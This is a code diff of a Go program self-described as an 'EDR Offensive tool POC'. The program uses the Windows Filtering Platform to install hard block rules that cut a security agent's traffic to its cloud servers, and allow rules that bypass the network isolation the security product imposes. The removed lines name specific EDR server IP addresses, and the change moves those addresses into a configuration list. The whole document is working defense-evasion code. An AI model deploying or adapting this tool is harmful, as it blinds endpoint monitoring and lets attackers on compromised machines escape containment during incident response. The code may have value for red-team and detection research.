@@ -31,7 +31,7 @@ type BlockIP struct {
 func main() {
 	// Check if the config file path is provided as an argument
 	if len(os.Args) < 2 {
-		fmt.Println("Usage: wfp.exe <config_file.json>")
+		fmt.Println("Usage: ", os.Args[0], " <config_file.json>")
 		os.Exit(1)
 	}
 	// Get the config file path from command-line arguments
@@ -51,11 +51,6 @@ func main() {
 	} else {
 		fmt.Printf("[+] Config file parsed\n")
 	}
-	//fmt.Println("provider_name = ", config.Provider.Provider_name)
-	//fmt.Println("provider_ID = ", config.Provider.Provider_ID)
-	//fmt.Println("sublayer_name = ", config.Sublayer.Sublayer_name)
-	//fmt.Println("sublayer_ID = ", config.Sublayer.Sublayer_ID)
-	//os.Exit(0)
 
 	session, err := wf.New(&wf.Options{
 		Name:    "EDR Offensive tool POC with WFP",
@@ -78,7 +73,7 @@ func main() {
 	})
 	if err != nil {
 		fmt.Println(err)
-		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of Provider ! Continuing still ...")
+		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of new Provider ! Continuing still ...")
 		fmt.Println("")
 	} else {
 		fmt.Println("[+] Adding Provider name = '", config.Provider.Provider_name, "' providerID = ", guidprovider, " Persistent = false")
@@ -97,7 +92,7 @@ func main() {
 	})
 	if err != nil {
 		fmt.Println(err)
-		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of sublayer ! Continuing still ...")
+		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of new sublayer ! Continuing still ...")
 		fmt.Println("")
 	} else {
 		fmt.Println("[+] Adding sublayer guid = ", guid, " name = ", config.Sublayer.Sublayer_name, " Isolation weight 0xffff")
@@ -124,34 +119,28 @@ func main() {
 		}
 	}
 
-	EDR_EU, err := netip.ParseAddr("34.102.140.103")
-	if err != nil {
-		panic(err)
-	}
-	EDR_DE, err := netip.ParseAddr("34.107.161.143")
-	if err != nil {
-		panic(err)
-	}
-	EDR_CH, err := netip.ParseAddr("34.149.180.250")
-	if err != nil {
-		panic(err)
-	}
-	LIVE_EU, err := netip.ParseAddr("35.244.251.25")
-	if err != nil {
-		panic(err)
-	}
-	LIVE_CH, err := netip.ParseAddr("34.65.213.226")
-	if err != nil {
-		panic(err)
-	}
-	LIVE_DE, err := netip.ParseAddr("34.107.61.141")
-	if err != nil {
-		panic(err)
-	}
-
 	for _, layer := range layers {
 		guid, _ := windows.GenerateGUID()
 		fmt.Println("[+] Adding WFP rule to block EDR flow guid = ", guid, " name = 'EDR_BLOCKING_RULE' for layer = ", layer)
+		conds := []*wf.Match{
+			{
+				Field: wf.FieldIPRemotePort,
+				Op:    wf.MatchTypeEqual,
+				Value: uint16(443), // adding filter port 443
+			},
+			{
+				Field: wf.FieldIPProtocol,
+				Op:    wf.MatchTypeEqual,
+				Value: wf.IPProtoTCP, // adding filter type = TCP
+			},
+		}
+		for _, entry := range TableBlockIP {
+			conds = append(conds, &wf.Match{
+				Field: wf.FieldIPRemoteAddress,
+				Op:    wf.MatchTypeEqual,
+				Value: entry.Entry, // adding each IP address as RemoteAddress
+			})
+		}
 		err = session.AddRule(&wf.Rule{
 			ID:         wf.RuleID(guid),
 			Name:       "EDR_BLOCKING_RULE",
@@ -162,48 +151,7 @@ func main() {
 			HardAction: true,  //rule cannot be overriden except by a Veto
 			Action:     wf.ActionBlock,
 			Weight:     1000,
-			Conditions: []*wf.Match{
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: EDR_EU,
-				},
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: EDR_DE,
-				},
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: EDR_CH,
-				},
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: LIVE_EU,
-				},
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: LIVE_DE,
-				},
-				{
-					Field: wf.FieldIPRemoteAddress,
-					Op:    wf.MatchTypeEqual,
-					Value: LIVE_CH,
-				},
-				{
-					Field: wf.FieldIPRemotePort,
-					Op:    wf.MatchTypeEqual,
-					Value: uint16(443),
-				},
-				{
-					Field: wf.FieldIPProtocol,
-					Op:    wf.MatchTypeEqual,
-					Value: wf.IPProtoTCP,
-				},
-			},
+			Conditions: conds,
 		})
 		if err != nil {
 			log.Print("ERROR: ", err)
@@ -219,10 +167,10 @@ func main() {
 
 	for _, layer := range isolationlayers {
 		guid, _ := windows.GenerateGUID()
-		fmt.Println("[+] adding WFP rule to Allow rule to bypass ISOLATION guid = ", guid, " name = XDR_Isolate_bypass_RULE for layer = ", layer)
+		fmt.Println("[+] adding WFP rule to Allow rule to bypass ISOLATION guid = ", guid, " name = 'EDR_Isolate_bypass_RULE' for layer = ", layer)
 		err = session.AddRule(&wf.Rule{
 			ID:         wf.RuleID(guid),
-			Name:       "XDR_Isolate_bypass_RULE",
+			Name:       "EDR_Isolate_bypass_RULE",
 			Layer:      layer,
 			Sublayer:   sublayerID,
 			Provider:   providerID,
@@ -260,10 +208,10 @@ func main() {
 
 	for _, layer := range isolationICMPlayers {
 		guid, _ := windows.GenerateGUID()
-		fmt.Println("[+] Adding WFP rule to Allow ANY ICMPv4 guid = ", guid, " name = XDR_Isolate_bypass_ICMP_RULE for layer = ", layer)
+		fmt.Println("[+] Adding WFP rule to Allow ANY ICMPv4 guid = ", guid, " name = 'EDR_Isolate_bypass_ICMP_RULE' for layer = ", layer)
 		err = session.AddRule(&wf.Rule{
 			ID:         wf.RuleID(guid),
-			Name:       "XDR_Isolate_bypass_ICMP_RULE",
+			Name:       "EDR_Isolate_bypass_ICMP_RULE",
 			Layer:      layer,
 			Sublayer:   sublayerID,
 			Provider:   providerID,
